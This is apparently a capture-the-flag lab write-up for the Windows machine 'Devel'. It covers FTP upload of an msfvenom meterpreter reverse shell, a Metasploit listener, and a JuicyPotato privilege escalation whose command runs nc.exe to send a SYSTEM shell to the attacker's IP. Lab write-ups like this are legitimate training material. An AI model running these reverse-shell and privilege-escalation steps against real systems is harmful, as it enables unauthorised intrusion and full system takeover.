# Devel

## Enumeration

First of all, lets start a basic nmap scan:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/688b4660-81f5-4cd1-b045-bdbc6bbd9a72)

As we can see, we y have port `21` and port `80` opened. We also can notice that the port `21` (FTP) is accessible by the `anonymous` user. We can connect and list the files on the `FTP` server:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/5a0161f9-5d77-4edf-9e28-c21e983efbf1)

As we can see, there is what seems to be the tree structure of the web server. When we go on the port `80`, we can see the `welcome.png` in the center of the web page:

## Initial Foothold
We can try to upload a web shell or a reverse shell using the `put` command on the `FTP` server. For that, I generated a meterpreter reverse shell using `msfvenom`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/08d024b9-bf08-40cb-a210-1aea82cfdeda)

I then uploaded it. Run the following command in the `msfconsole` to get a listener on port `443`:

```shell
set payload windows/meterpreter/reverse_tcp

set lhost tun0


set lport 443

run
```

I then go to the url `http://10.10.10.5/config.aspx`, and I get a meterpreter session:

Now that we have a meterpreter session, we can execute basic commands to be able to understand who we are and what rights we do have:

## Privilege Escalation

As we can see, we have a lot of rights. The `SeImpersonatePrivilege` is vulnerable to the `JuicyPotato` vulnerability (that I explained [here](https://nouman404.github.io/Notes/Privilege_Escalation/Windows_PE#seimpersonate--seassignprimarytoken)). I then uploaded `nc.exe` and `JuicyPotato.exe`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/82b963b1-59c2-4f4c-8e82-7c67b2237602)

But when I tried to run the `JuicyPotato` command, I got an error saying that it wasn't the correct format:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/770800a9-e6bd-4609-9666-7b4a95ea5b1e)

So I used [this](https://github.com/ivanitlearning/Juicy-Potato-x86/releases) version of `JuicyPotato` that I called `JP.exe`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/8e87011a-a554-48ab-8b33-f44893f73596)

Now this should work, so I create a basic `nc` instance on the port `445` and run the following command:

```powershell
c:\Users\Public\Downloads\JP.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\Downloads\nc.exe 10.10.14.56 445 -e cmd" -t * 
```

This default command didn't work, so I tried to execute the same command using the `-c` option to specify the `CLSID`. CLSID stands for "Class Identifier" and is a unique identifier used in the Windows operating system to identify COM (Component Object Model) objects and their associated components. I then referred to [this page](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise) and tried every `CLSID` to get an `NT AUTORITY/SYSTEM` command prompt (the correct one is the second one `{03ca98d6-ff5d-49b8-abc6-03dd84127020}`):

> Note that we selected `Windows 7 Enterprise` from [this page](https://github.com/ohpe/juicy-potato/tree/master/CLSID) first to have a correct list of `CLSID`s.
{: .prompt-tip}

The command worked, and as we can see, we have a `cmd` as  `NT AUTORITY/SYSTEM`:

We can now get both flags, and voil√†...
